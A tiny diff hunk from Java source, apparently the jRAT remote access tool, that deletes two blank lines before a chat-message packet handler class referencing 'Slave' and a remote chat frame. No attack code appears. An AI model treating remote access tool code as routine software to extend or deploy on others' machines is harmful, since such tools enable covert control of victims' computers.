@@ -11,8 +11,6 @@ import javax.swing.text.StyleContext;
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameRemoteChat;
 
-
-
 public class Packet35ChatMessage extends AbstractIncomingPacket {
 
 	@Override
